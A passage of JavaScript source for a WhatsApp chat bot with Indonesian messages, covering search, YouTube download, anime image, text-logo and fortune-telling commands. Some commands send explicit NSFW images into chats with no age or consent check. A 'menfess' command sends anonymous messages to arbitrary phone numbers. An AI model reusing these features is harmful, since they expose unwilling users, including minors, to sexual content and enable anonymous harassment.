                Manik.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case prefix+'google':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
        if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!text) return reply `Example : ${command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `≻ *Title* : ${g.title}\n`
                teks += `≻ *Description* : ${g.snippet}\n`
                teks += `≻ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                reply(teks)
                })
                }
                break
        case prefix+'gimage': case prefix+'googleimage':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
        if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
        if (!text) return reply `Example : ${command} ml nana`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: Manik.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case prefix+'play': case prefix+'ytplay':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	    if (!text) return m.reply(`Example : ${command} story wa anime`)
                m.reply('wait')
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
				let cc = `⊳ Title : ${anu.title}
						⊳ Ext : Search
						⊳ ID : ${anu.videoId}
						⊳ Duration : ${anu.timestamp}
						⊳ Viewers : ${anu.views}
						⊳ Upload At : ${anu.ago}
						⊳ Author : ${anu.author.name}
						⊳ Channel : ${anu.author.url}
						⊳ Description : ${anu.description}
						⊳ Url : ${anu.url}`
				
				const buttons = [
					  {buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: 'VIDEO'}, type: 1},
					  {buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: 'AUDIO'}, type: 1}
					]

					const buttonMessage = {
						image: {url: anu.thumbnail},
						caption: cc,
						footer: 'Video or Audio??',
						buttons: buttons,
						headerType: 4
					}

					await Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
				console.log(anu)
      	      }
      	      break
			  
			  
	    case prefix+'ytmp3':{
				addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                let { yta } = require('./FuncBot/y2mate')
                if (!text) return m.reply(`Example : ${command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
                let quality = args[2] ? args[2] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                Manik.sendMessage(from, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
       	     }
        	    break
            case prefix+'ytmp4':{
				addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                let { ytv } = require('./FuncBot/y2mate')
                if (!text) return m.reply(`Example : ${command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
                let quality = args[2] ? args[2] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                Manik.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
        	    }
        	    break
	    case prefix+'getmusic':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	    if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!text) return reply `Example : ${command} 1`
                if (!m.quoted) return reply('Reply Pesan')
                if (!m.quoted.isBaileys) return reply `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) return reply `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
		let { aiovideodl } = require('./FuncBot/scraper')
                let result = await aiovideodl(urls[text - 1])
                let { url, title, thumbnail, duration, medias } = result
                let quality = args[2] ? args[2] : '128kbps'                
                let media = medias.filter(v => v.videoAvailable == false && v.audioAvailable == true && v.quality == quality).map(v => v)
                if (media[0].formattedSize.split('MB')[0] >= 100000) return reply('File Melebihi Batas'+util.format(media))
                Manik.sendImage(m.chat, thumbnail, `âž£ Title : ${title}\nâž£ File Size : ${media[0].formattedSize}\nâž£ Url : ${url}\nâž£ Ext : MP3\nâž£ Resolusi : ${args[2] || '128kbps'}`, m)
                Manik.sendMessage(m.chat, { audio: { url: media[0].url }, mimetype: 'audio/mp4', fileName: `${title}.mp3` }, { quoted: m })
            }
            break
            case prefix+'getvideo':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!text) return reply `Example : ${command} 1`
                if (!m.quoted) return reply('Reply Pesan')
                if (!m.quoted.isBaileys) return reply `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) return reply `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
		let { aiovideodl } = require('./FuncBot/scraper')
                let result = await aiovideodl(urls[text - 1])
                let { url, title, thumbnail, duration, medias } = result
                let quality = args[2] ? args[2] : '360p'                
                let media = medias.filter(v => v.videoAvailable == true && v.audioAvailable == false && v.quality == quality).map(v => v)
                if (media[0].formattedSize.split('MB')[0] >= 100000) return reply('File Melebihi Batas'+util.format(media))
                Manik.sendMessage(m.chat, { video: { url: media[0].url }, fileName: `${title}.mp4`, mimetype: 'video/mp4', caption: `âž£ Title : ${title}\nâž£ File Size : ${media[0].formattedSize}\nâž£ Url : ${url}\nâž£ Ext : MP4\nâž£ Resolusi : ${args[2] || '360p'}` }, { quoted: m })
            }
            break
            case prefix+'pinterest':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
		let { pinterest } = require('./FuncBot/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                Manik.sendMessage(m.chat, { image: { url: result }, caption: '✓Media Url : '+result }, { quoted: m })
            }
            break
			
case prefix+'waifu':{
const axios = require('axios')
let fetch = require('node-fetch')
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
db.users[m.sender].limit -= 1 // -1 limit
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
//Manik.sendFile(m.chat, data.url, 'Ni Cewe 2D Lu')
Manik.sendButtonImg(m.chat, data.url, 'Ni Cewe 2D Lu', 'Yudha BOT', `Next`, `.waifu` , m)
})
break
}


case prefix+'cry':case prefix+'kill':case prefix+'hug':case prefix+'pat':case prefix+'lick':case prefix+'kiss':case prefix+'bite':case prefix+'yeet':case prefix+'neko':case prefix+'bully':case prefix+'bonk':case prefix+'wink':case prefix+'poke':case prefix+'nom':case prefix+'slap':case prefix+'waifu':case prefix+'smile':case prefix+'wave':case prefix+'awoo':case prefix+'blush':case prefix+'smug':case prefix+'glomp':case prefix+'happy':case prefix+'dance':case prefix+'cringe':case prefix+'cuddle':case prefix+'highfive':case prefix+'shinobu':case prefix+'megumin':case prefix+'handhold':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
reply('Loading...')
const axios = require('axios')
axios.get(`https://api.waifu.pics/sfw/${command.slice(1)}`)
.then(({data}) => {
Manik.sendMessage(from,{ image: { url: data.url}, caption: mess.done})
})
}
break			
	    case prefix+'couple': case prefix+'ppcp':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	    if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                Manik.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                Manik.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case prefix+'coffee': case prefix+'kopi':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕Random Coffee☕`,
                    footer: Manik.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case prefix+'wallpaper':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!text) return reply `Titlenya mana?`
		let { wallpaper } = require('./FuncBot/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `≻ Title : ${result.title}\n≻ Category : ${result.type}\n≻ Detail : ${result.source}\n≻ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: Manik.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case prefix+'wikimedia':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!text) return reply `Titlenya mana?`
		let { wikimedia } = require('./FuncBot/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `≻ Title : ${result.title}\n≻ Source : ${result.source}\n≻ Media Url : ${result.image}`,
                    footer: Manik.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case prefix+'mode': case prefix+'set':{
	if (!isManik) return reply(mess.owner)
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
        const buttons = [
{buttonId: `${prefix}self`, buttonText: {displayText: 'SELF'}, type: 1},
{buttonId: `${prefix}public`, buttonText: {displayText: 'PUBLIC'}, type: 1}
]

const buttonMessage = {
text: "Pilih Salah Satu",
footerText: 'Hello Owner',
buttons: buttons,
headerType: 1
}
                Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break            
            case prefix+'yatim':{
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
 if (!m.isGroup) return reply(mess.group)
            let member = participants.map(u => u.id)
            let oi = m.sender
            let ytm = member[Math.floor(Math.random() * member.length)]
            let mty = `Cieee Yatim Baru

 @${ytm.split('@')[0]}`
            let ments = [oi, ytm]
            let buttons = [
                        { buttonId: prefix+'yatim', buttonText: { displayText: 'Yatim' }, type: 1 }
                    ]
                     Manik.sendButtonText(m.chat, buttons, mty, Manik.user.name, m, {mentions: ments})
}
break
case prefix+'piatu':
case prefix+'piyatu':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
 if (!m.isGroup) return reply(mess.group)
            let member = participants.map(u => u.id)
            let bh = m.sender
            let bra = member[Math.floor(Math.random() * member.length)]
            let bruh = `Cieee Piatu Baru

 @${bra.split('@')[0]}`
            let ments = [bh, bra]
            let buttons = [
                        { buttonId: prefix+'piatu', buttonText: { displayText: 'Piatu' }, type: 1 }
                    ]
                     Manik.sendButtonText(m.chat, buttons, bruh, Manik.user.name, m, {mentions: ments})
}
break
            case prefix+'quotesanime': case prefix+'quoteanime':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
		let { quotesAnime } = require('./FuncBot/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            
                // Ephoto 360 //
                case prefix+'wetglass':case prefix+'multicolor3d':case prefix+'watercolor':case prefix+'luxurygold':case prefix+'galaxywallpaper':case prefix+'lighttext':case prefix+'beautifulflower':case prefix+'puppycute':case prefix+'royaltext':case prefix+'heartshaped':case prefix+'birthdaycake':case prefix+'galaxystyle':case prefix+'hologram3d':case prefix+'greenneon':case prefix+'glossychrome':case prefix+'greenbush':case prefix+'metallogo':case prefix+'noeltext':case prefix+'glittergold':case prefix+'textcake':case prefix+'starsnight':case prefix+'wooden3d':case prefix+'textbyname':case prefix+'writegalacy':case prefix+'galaxybat':case prefix+'snow3d':case prefix+'birthdayday':case prefix+'goldplaybutton':case prefix+'silverplaybutton':case prefix+'freefire':{
 if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                               if (!text) return reply('Textnya Mana Kak?')
                reply(mess.wait)
                Manik.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command.slice(1)}?apikey=${lolkey}&text=${text}`}, caption: `Nih Dah Jadi ${command.slice(1)}📸` }, { quoted: m })
            }
            break
            case prefix+'ttlogo':case prefix+'arcade8bit':case prefix+'battlefield4':case prefix+'pubg':{
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!text) return reply('Textnya Mana Kak?')
                reply(mess.wait)
                Manik.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy2/${command.slice(1)}?apikey=${lolkey}&text=${text}`}, caption: `Nih Dah Jadi ${command.slice(1)}📸` }, { quoted: m })
            }
            break
            // Photo Oxy //
            case prefix+'shadow':case prefix+'cup':case prefix+'cup1':case prefix+'romance':case prefix+'smoke':case prefix+'burnpaper':case prefix+'lovemessage':case prefix+'undergrass':case prefix+'love':case prefix+'coffe':case prefix+'woodheart':case prefix+'woodenboard':case prefix+'summer3d':case prefix+'wolfmetal':case prefix+'nature3d':case prefix+'underwater':case prefix+'goldenrose':case prefix+'summernature':case prefix+'letterleaves':case prefix+'glowingneon':case prefix+'fallleaves':case prefix+'flamming':case prefix+'harrypotter':case prefix+'carvedwood':{
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!text) return reply('Textnya Mana Kak?')
                reply(mess.wait)
                Manik.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command.slice(1)}?apikey=${lolkey}&text=${text}`}, caption: `Nih Dah Jadi ${command.slice(1)}📸` }, { quoted: m })
            }
            break
            case prefix+'pornhub':case prefix+'glitch':case prefix+'avenger':case prefix+'space':case prefix+'ninjalogo':case prefix+'marvelstudio':case prefix+'lionlogo':case prefix+'wolflogo':case prefix+'steel3d':case prefix+'wallgravity':{
            if (!text) return reply('Textnya Mana Kak?')
                reply(mess.wait)
                Manik.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command.slice(1)}?apikey=${lolkey}&text=${text}`}, caption: `Nih Dah Jadi ${command.slice(1)}📸` }, { quoted: m })
            }
            break
            case prefix+'jodohku':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!m.isGroup) return reply(mess.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: prefix+'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, jawab, Manik.user.name, m, {mentions: ments})
            }
            break
        case prefix+'menfess':
			case prefix+'menfes':
			case prefix+'confes':
			case prefix+'confess':
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${command} nomer|pengirim|pesan\n\nContoh ${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				let nomorr = nomor.replace('+', '')
				let nomorrr = nomorr.replace(' ', '')
				let nomorrrr = nomorrr.replace('-', '')
				let nomorrrrr = nomorrrr.replace('-', '')
				let nemer = Manik.getName(`${nomorrrrr}@s.whatsapp.net`)
				if (nemer == 'undefined'){
					nemer == `${nomorrrrr}`
					}
				if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				 let teksnya = `Hai kak ada Menfess nih!!\n─────────────\n*ManikBot*\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`

				 but = [
					{ urlButton: { displayText: `𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐔𝐬!`, url : `https://instagram.com/aryamanik___` } },
                    { quickReplyButton: { displayText: `Balas Menfes`, id: `${prefix}chatwith2 ${sender.replace("@s.whatsapp.net", "")}` } },
                    { quickReplyButton: { displayText: `Kirim Menfesmu`, id: `${prefix}menfess` } }
                		]
					Manik.sendMessage(`${nomorrrrr}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, templateButtons: but, footer: `Ciee ada yang ngirim pesan nih\n©AryaManik` })
				m.reply(`Sukses Mengirim Menfess ke ${nemer}`)
				break

			case prefix+'menfesconfirm':
 				 Manik.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🤭`})
				  m.reply(`Terimakasih Menfess Telah Diterima.`)
				break
            case prefix+'jadian':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!m.isGroup) return reply(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian 💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: prefix+'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, jawab, Manik.user.name, m, {mentions: menst})
            }
            break
                // Textprome //
                case prefix+'blackpink':case prefix+'neon':case prefix+'greenneon':case prefix+'advanceglow':case prefix+'futureneon':case prefix+'sandwriting':case prefix+'sandsummer':case prefix+'sandengraved':case prefix+'metaldark':case prefix+'neonlight':case prefix+'holographic':case prefix+'text1917':case prefix+'minion':case prefix+'deluxesilver':case prefix+'newyearcard':case prefix+'bloodfrosted':case prefix+'halloween':case prefix+'jokerlogo':case prefix+'fireworksparkle':case prefix+'natureleaves':case prefix+'bokeh':case prefix+'toxic':case prefix+'strawberry':case prefix+'box3d':case prefix+'roadwarning':case prefix+'breakwall':case prefix+'icecold':case prefix+'luxury':case prefix+'cloud':case prefix+'summersand':case prefix+'horrorblood':case prefix+'thunder':{
                if (!text) return reply('Textnya Mana Kak?')
                reply(mess.wait)
                Manik.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command.slice(1)}?apikey=${lolkey}&text=${text}`}, caption: `Nih Dah Jadi ${command.slice(1)}📸` }, { quoted: m })
            }
            break
            case prefix+'bj':case prefix+'ero':case prefix+'cum':case prefix+'feet':case prefix+'yuri':case prefix+'trap':case prefix+'lewd':case prefix+'feed':case prefix+'eron':case prefix+'solo':case prefix+'gasm':case prefix+'poke':case prefix+'anal':case prefix+'holo':case prefix+'tits':case prefix+'kuni':case prefix+'kiss':case prefix+'erok':case prefix+'smug':case prefix+'baka':case prefix+'solog':case prefix+'feetg':case prefix+'lewdk':case prefix+'waifu':case prefix+'pussy':case prefix+'femdom':case prefix+'cuddle':case prefix+'hentai':case prefix+'eroyuri':case prefix+'cum_jpg':case prefix+'blowjob':case prefix+'erofeet':case prefix+'holoero':case prefix+'classic':case prefix+'erokemo':case prefix+'fox_girl':case prefix+'futanari':case prefix+'lewdkemo':case prefix+'wallpaper':case prefix+'pussy_jpg':case prefix+'kemonomimi':case prefix+'nsfw_avatar':{
                reply(mess.wait)
                Manik.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random2/${command.slice(1)}?apikey=${lolkey}`}, caption: `Nih Dah Jadi ${command.slice(1)}📸` }, { quoted: m })
            }
            break
            case prefix+'chiisaihentai':case prefix+'trap':case prefix+'blowjob':case prefix+'yaoi':case prefix+'ecchi':case prefix+'ahegao':case prefix+'hololewd':case prefix+'sideoppai':case prefix+'animefeets':case prefix+'animebooty':case prefix+'animethighss':case prefix+'hentaiparadise':case prefix+'animearmpits':case prefix+'hentaifemdom':case prefix+'lewdanimegirls':case prefix+'biganimetiddies':case prefix+'animebellybutton':case prefix+'hentai4everyone':{
            if (!text) return reply('Textnya Mana Kak?')
                reply(mess.wait)
                Manik.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command.slice(1)}?apikey=${lolkey}`}, caption: `Nih Dah Jadi ${command.slice(1)}📸` }, { quoted: m })
            }
            break
	    case prefix+'nomerhoki': case prefix+'nomorhoki':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!Number(text)) return reply(`Example : ${command} 6288292024190`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nomor HP :* ${anu.message.nomer_hp}\n≻ *Angka Shuzi :* ${anu.message.angka_shuzi}\n≻ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n≻ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case prefix+'artimimpi': case prefix+'tafsirmimpi':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Mimpi :* ${anu.message.mimpi}\n≻ *Arti :* ${anu.message.arti}\n≻ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case prefix+'ramalanjodoh': case prefix+'ramaljodoh':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik, 28, 10, 2005, Dini, 1, 7, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama Anda :* ${anu.message.nama_anda.nama}\n≻ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n≻ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n≻ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n≻ *Hasil :* ${anu.message.result}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'ramalanjodohbali': case prefix+'ramaljodohbali':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik, 28, 10, 2005, Dini, 1, 7, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama Anda :* ${anu.message.nama_anda.nama}\n≻ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n≻ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n≻ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n≻ *Hasil :* ${anu.message.result}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'suamiistri':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik, 28, 10, 2005, Dini, 1, 7, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama Suami :* ${anu.message.suami.nama}\n≻ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n≻ *Nama Istri :* ${anu.message.istri.nama}\n≻ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n≻ *Hasil :* ${anu.message.result}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'ramalancinta': case prefix+'ramalcinta':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik, 28, 10, 2005, Dini, 1, 7, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama Anda :* ${anu.message.nama_anda.nama}\n≻ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n≻ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n≻ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n≻ *Sisi Positif :* ${anu.message.sisi_positif}\n≻ *Sisi Negatif :* ${anu.message.sisi_negatif}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'artinama':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama :* ${anu.message.nama}\n≻ *Arti :* ${anu.message.arti}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'kecocokannama': case prefix+'cocoknama':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} Manik, 28, 10, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
